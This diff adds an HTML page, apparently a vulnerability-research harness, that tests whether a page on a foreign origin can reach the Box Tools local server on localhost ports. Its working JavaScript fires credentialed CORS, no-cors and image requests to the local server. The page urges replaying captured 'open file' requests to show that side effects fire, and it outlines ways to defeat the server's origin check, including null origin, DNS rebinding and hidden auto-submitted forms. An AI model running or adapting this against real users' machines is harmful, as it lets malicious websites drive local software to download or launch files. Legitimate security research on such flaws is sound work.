@@ -1,0 +1,202 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Box Local Com Server — cross-origin reachability test</title>
+<style>
+  :root { color-scheme: light dark; }
+  body { font: 14px/1.55 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+         margin: 0; padding: 28px; max-width: 1000px; }
+  h1 { font-size: 20px; margin: 0 0 4px; }
+  .sub { opacity: .7; margin: 0 0 22px; }
+  fieldset { border: 1px solid #8883; border-radius: 8px; padding: 14px 16px; margin: 0 0 18px; }
+  legend { font-weight: 600; padding: 0 6px; }
+  label { display: block; font-size: 12px; opacity: .75; margin: 8px 0 3px; }
+  input[type=text] { width: 100%; padding: 7px 9px; font: 12px/1.4 ui-monospace, SFMono-Regular, Menlo, monospace;
+                     border: 1px solid #8886; border-radius: 5px; background: transparent; color: inherit;
+                     box-sizing: border-box; }
+  button { font: 600 14px/1 inherit; padding: 10px 18px; border-radius: 6px; border: 0;
+           background: #2563eb; color: #fff; cursor: pointer; }
+  button:hover { background: #1d4ed8; }
+  table { border-collapse: collapse; width: 100%; margin-top: 6px; }
+  th, td { text-align: left; padding: 7px 9px; border-bottom: 1px solid #8883; vertical-align: top; }
+  th { font-size: 11px; text-transform: uppercase; letter-spacing: .04em; opacity: .6; }
+  td.tech { font: 12px/1.4 ui-monospace, SFMono-Regular, Menlo, monospace; }
+  .ok   { color: #16a34a; font-weight: 600; }
+  .bad  { color: #dc2626; font-weight: 600; }
+  .warn { color: #d97706; font-weight: 600; }
+  .verdict { padding: 14px 16px; border-radius: 8px; margin: 18px 0; font-weight: 600; display: none; }
+  .verdict.hit  { background: #dc262622; border: 1px solid #dc2626; }
+  .verdict.miss { background: #16a34a22; border: 1px solid #16a34a; }
+  .note { font-size: 12.5px; opacity: .8; }
+  code { font: 12px ui-monospace, SFMono-Regular, Menlo, monospace; background: #8882; padding: 1px 4px; border-radius: 3px; }
+</style>
+</head>
+<body>
+
+<h1>Box Local Com Server — cross-origin reachability test</h1>
+<p class="sub">Serve this page from any origin that is <strong>not</strong> box.com and not localhost,
+then open it in a browser on a machine running Box Tools.</p>
+
+<fieldset>
+  <legend>Target</legend>
+  <label>Ports to try (comma separated)</label>
+  <input type="text" id="ports" value="17223,17224">
+  <label>Request path — replace with a <em>real</em> captured request for a meaningful side-effect test</label>
+  <input type="text" id="path" value="/application_request?application=BoxEdit&com=probe&timeout=1000">
+  <p class="note" style="margin:12px 0 0">
+    The default path is the documented handshake shape. Capture a genuine "open file" request off the
+    loopback interface first (see <code>lab-setup.md</code>) and paste it here — that is what turns a
+    reachability result into a demonstrated impact.
+  </p>
+</fieldset>
+
+<button id="run">Run tests</button>
+
+<div class="verdict" id="verdict"></div>
+
+<table id="results" hidden>
+  <thead>
+    <tr><th style="width:34%">Test</th><th style="width:12%">Result</th><th>What it means</th></tr>
+  </thead>
+  <tbody></tbody>
+</table>
+
+<fieldset style="margin-top:24px">
+  <legend>Reading the results</legend>
+  <p class="note" style="margin-top:0">
+    <strong>Readable response</strong> (a successful <code>cors</code> fetch) is the strong result: this origin
+    can both drive the server <em>and</em> read what comes back — session data, file lists, tokens.
+  </p>
+  <p class="note">
+    <strong>Side effect fired</strong> is the one people wrongly dismiss. A plain <code>GET</code> with no custom
+    headers is never preflighted. The browser will refuse to hand <em>you</em> the response body, but the request
+    still arrived and the server still acted on it. If Box Edit downloads and opens a file as a result, the
+    response body is irrelevant — that is the vulnerability. The <code>no-cors</code>, image and form tests below
+    exist purely to prove delivery, so a "blocked" readable result plus a timing/behaviour signal here is still
+    a valid, reportable finding.
+  </p>
+  <p class="note">
+    <strong>Everything refused</strong> means the server checks the Origin. Next step is not to give up but to
+    attack the check itself: <code>null</code> origin from a sandboxed iframe, suffix confusion, scheme downgrade,
+    and DNS rebinding against the <code>Host</code> header. <code>probe_com_server.py</code> covers those from
+    outside the browser.
+  </p>
+</fieldset>
+
+<script>
+const $ = id => document.getElementById(id);
+const tbody = $('results').querySelector('tbody');
+
+function row(name, verdict, cls, meaning) {
+  const tr = document.createElement('tr');
+  tr.innerHTML = `<td class="tech">${name}</td><td class="${cls}">${verdict}</td><td class="note">${meaning}</td>`;
+  tbody.appendChild(tr);
+}
+
+// A reachable-but-unreadable request still fires the side effect. We time it: a connection
+// that is refused fails fast and differently from one that is accepted and served.
+async function timed(fn) {
+  const t0 = performance.now();
+  try { const r = await fn(); return { ok: true, ms: performance.now() - t0, r }; }
+  catch (e) { return { ok: false, ms: performance.now() - t0, err: String(e) }; }
+}
+
+async function testPort(port, path) {
+  const base = `http://127.0.0.1:${port}`;
+  const url = base + path;
+  let reachable = false, readable = false;
+
+  // 1. CORS fetch — can this origin READ the response?
+  const cors = await timed(() => fetch(url, { mode: 'cors', credentials: 'include' })
+                                  .then(async r => ({ status: r.status, body: (await r.text()).slice(0, 200) })));
+  if (cors.ok) {
+    readable = reachable = true;
+    row(`:${port} fetch(mode:cors)`, 'READABLE', 'bad',
+        `HTTP ${cors.r.status}. This origin can read the response body: <code>${
+          cors.r.body.replace(/[<>&]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c])) || '(empty)'
+        }</code> — no origin restriction, full read access.`);
+  } else {
+    row(`:${port} fetch(mode:cors)`, 'blocked', 'ok',
+        `${cors.err} — either CORS refused it or nothing is listening. The next tests tell them apart.`);
+  }
+
+  // 2. no-cors fetch — proves DELIVERY even when the body is opaque.
+  const nocors = await timed(() => fetch(url, { mode: 'no-cors', credentials: 'include' }));
+  if (nocors.ok) {
+    reachable = true;
+    row(`:${port} fetch(mode:no-cors)`, 'DELIVERED', 'bad',
+        `Opaque response returned in ${nocors.ms.toFixed(0)}ms — the request reached the server and was ` +
+        `answered. Any side effect it triggers has already happened, whether or not the body is readable.`);
+  } else {
+    row(`:${port} fetch(mode:no-cors)`, 'failed', 'ok',
+        `${nocors.err} (${nocors.ms.toFixed(0)}ms) — consistent with nothing listening on this port.`);
+  }
+
+  // 3. <img> load — the simplest possible side-effect delivery, no JS fetch involved.
+  const img = await timed(() => new Promise((res, rej) => {
+    const i = new Image();
+    i.onload = () => res('load'); i.onerror = () => rej(new Error('error event'));
+    setTimeout(() => rej(new Error('timeout')), 4000);
+    i.src = url + (path.includes('?') ? '&' : '?') + '_img=' + Date.now();
+  }));
+  // An error event still means the bytes went out; only the decode failed.
+  if (img.ms < 3500) {
+    reachable = reachable || img.ms < 1500;
+    row(`:${port} &lt;img src&gt;`, img.ok ? 'DELIVERED' : 'sent', img.ok ? 'bad' : 'warn',
+        `Resolved in ${img.ms.toFixed(0)}ms. A fast error event means the server answered and the bytes ` +
+        `simply were not an image — the request was still processed. A 4s timeout would mean no listener.`);
+  } else {
+    row(`:${port} &lt;img src&gt;`, 'timeout', 'ok', 'No response within 4s — nothing answering on this port.');
+  }
+
+  // 4. Form POST — navigational, ignores CORS entirely, survives strict fetch policies.
+  row(`:${port} form POST`, 'manual', 'warn',
+      `Not fired automatically (it navigates a frame). If fetch is blocked but the server accepts POST, ` +
+      `a hidden iframe + auto-submitted form still delivers it: no preflight, no CORS, no way for the ` +
+      `server to refuse it based on the browser alone.`);
+
+  return { port, reachable, readable };
+}
+
+$('run').addEventListener('click', async () => {
+  tbody.innerHTML = '';
+  $('results').hidden = false;
+  $('verdict').style.display = 'none';
+  $('run').disabled = true;
+  $('run').textContent = 'Running…';
+
+  const path = $('path').value.trim() || '/';
+  const ports = $('ports').value.split(',').map(s => parseInt(s.trim(), 10)).filter(Boolean);
+  const out = [];
+  for (const p of ports) out.push(await testPort(p, path));
+
+  const readable = out.some(o => o.readable);
+  const reachable = out.some(o => o.reachable);
+  const v = $('verdict');
+  v.style.display = 'block';
+  if (readable) {
+    v.className = 'verdict hit';
+    v.innerHTML = `Origin <code>${location.origin}</code> can READ responses from the Box Local Com Server. ` +
+                  `No origin restriction is being enforced. Now establish impact: replay a captured ` +
+                  `"open file" request and show that Box Edit acts on it.`;
+  } else if (reachable) {
+    v.className = 'verdict hit';
+    v.innerHTML = `Requests from <code>${location.origin}</code> are REACHING the server; only the response ` +
+                  `body is withheld by the browser. Side effects still fire. Replay a captured "open file" ` +
+                  `request and watch the host — if a file downloads or an application launches, that is the ` +
+                  `finding, and the unreadable response does not diminish it.`;
+  } else {
+    v.className = 'verdict miss';
+    v.innerHTML = `Nothing answered on ${ports.join('/')} from this origin. Confirm Box Tools is running ` +
+                  `(<code>probe_com_server.py</code> from the same machine), then attack the origin check ` +
+                  `itself: null origin, suffix confusion, scheme downgrade, DNS rebinding.`;
+  }
+
+  $('run').disabled = false;
+  $('run').textContent = 'Run tests';
+});
+</script>
+</body>
+</html>
